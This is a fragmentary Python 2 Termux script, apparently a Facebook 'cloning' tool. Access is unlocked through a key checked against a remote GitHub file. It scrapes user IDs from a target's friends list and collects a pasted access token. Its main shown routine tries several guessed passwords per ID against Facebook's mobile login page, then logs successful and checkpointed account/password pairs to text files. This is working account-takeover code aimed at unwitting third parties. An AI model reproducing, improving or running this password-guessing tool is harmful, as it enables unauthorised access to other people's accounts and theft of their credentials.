...
def main_apv():
    ...
    try:
        ...
        print '           Hello Dear, This tool is free'
        print '           You want Access this tool'
        print '           Contact me on Facebook Thanks'
        print '           press the enter for Access'
        print ''
        ...
        print ''
        print '           Your Key'
        print '           Copy and send me on Facebook'
        print ''
        print ''
        print '''
        raw_input('    Restart your termux')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100010399241489')

    r1 = requests.get('https://raw.githubusercontent.com/ALI-XP/aproval/main/Approval.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_system():
    ...
    print ''
    print 39 * '~'
    print '\x1b[1;97m[1]   Public Cloning      \x1b[1;92m(Login)'
    print '\x1b[1;97m[2]   Random Cloning     \x1b[1;92m (No Login)'
    print '\x1b[1;97m[3]   File Cloning       \x1b[1;92m (No Login)'
    print '\x1b[1;97m[4]   File Making Menu\x1b[1;92m    (Login)'
    print '\x1b[1;97m[5]   Check Subscription '
    print '\x1b[1;97m[6]   Update Tools'
    print '\x1b[1;97m[7]   For Any Help Massage WhatsApp'
    print 43 * '~'
    print '\x1b[1;92m[*]\x1b[1;95m For Need Any Help Type 7 And \x1b[1;92mMessage me on Facebook  '
    print 43 * '~'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        print ''
        print '\x1b[1;94m Cheking Access ....\x1b[1;97m'
        time.sleep(3)
        fb_menu()
    elif mx == '2':
        print ''
        ...
        print ''
        print '\x1b[1;97m Cheking Access ....\x1b[1;97m'
        time.sleep(3)
        grap()
    elif mx == '5':
        os.system('clear')
        ...
        print ''
        print ''
        print '\x1b[1;97m        Congratulations dude'
        print '\x1b[1;97m        Your are member  '
        print '\x1b[1;97m        Enjoy this tool '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('rm -rf Free')
        os.system('git clone https://github.com/ALI-XP/Free')
...
def numcloning():
    ...
    print 'If idz not coming then use (airplane) Flight mod'
    os.system('echo " ------------------------------------"| lolcat')
...
def fb_menu():
    ...
    try:
        ...
        print '\x1b[1;97m\n[0] Back'
        print 39 * '-'
        pp = raw_input('\x1b[1;97m\nSelect :\x1b[1;91m ')
        if pp == '1':
            os.system('clear')
            print logo
            print '\x1b[1;97m\n[*] Enter Your Token Hear'
            print ''
            tok = raw_input('\x1b[1;97m\n[*]Paste token :\x1b[1;97m ')
            j = open('token.txt', 'w')
            j.write(tok)
            j.close()
            ...
            try:
                ...
                print ''
                print ''
                print '\x1b[1;97m     Your Token Is Expire'
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;97m[1] Public Cloning Method (1)'
    print '\x1b[1;97m[2] Public Cloning Method (2)'
    print '\x1b[1;97m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;97m      [ Public Cloning Method (1) ]'
        print ''
        print ' [\x1b[1;97m cloning with pass or name + pass ]'
        print ''
        print '\x1b[1;97m[1] Cloning with password'
        print '\x1b[1;97m[2] Cloning with name + pass'
        print '\x1b[1;97m[0] Back'
        print ''
        c = raw_input('[!] Select : ')
        if c == '1':
        ...
        print ''
        print '\x1b[1;97m      [ Public Cloning Method (2) ]'
        print ''
        print '\x1b[1;97m [ cloning with pass or name + pass ]'
        print ''
        print '\x1b[1;97m[1] Cloning With Choice Password'
        print '\x1b[1;97m[2] Cloning With Name + Pass'
        print '\x1b[1;97m[3] Cloning With Auto Pass'
        print '\x1b[1;97m[0] Back'
        print ''
        vv = raw_input('\x1b[1;95m[!] Select\x1b[1;97m ')
        if vv == '1':
            xokp()
        elif vv == '2':
            xoknp()
        ...
        print ''
        print ''
        print '\x1b[1;97m     [ File Making ]'
        print ''
        print '\x1b[1;97m  [ Maximum Limit 10 IDs ]'
        print ''
        c = raw_input('\x1b[1;97m      [*] How Many Links Do You Want To Dump : ')
        if c == '1':
            ext1()
        elif c == '2':
            ext2()
...
def mineExt():
    ...
    fuck.close()
    print ''
    print sm + '[=] Extracting From : ' + nid + ' > \x1b[1;97mFriends'
    print ''
    time.sleep(2)
    ...
    print g + '[=] Extracting From XIDI : ' + my_line[:15]
...
def xokpauto():
    ...
    fuck.close()
    print ''
    print sm + '[=] Transfer From : ' + nid + ' > \x1b[1;97mFriends'
    print ''
    time.sleep(2)
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass1
                ok = open('XIDI-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass1
                cp = open('XIDI-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass2
                    ok = open('XIDI-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass2
                    cp = open('XIDI-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass3
                        ok = open('XIDI-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass3
                        cp = open('XIDI-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass4
                            ok = open('XIDI-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass4
                            cp = open('XIDI-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[XIDI-OK] ' + uid + ' | ' + pass5
                                ok = open('XIDI-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[XIDI-CP] ' + uid + ' | ' + pass5
                                cp = open('XIDI-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
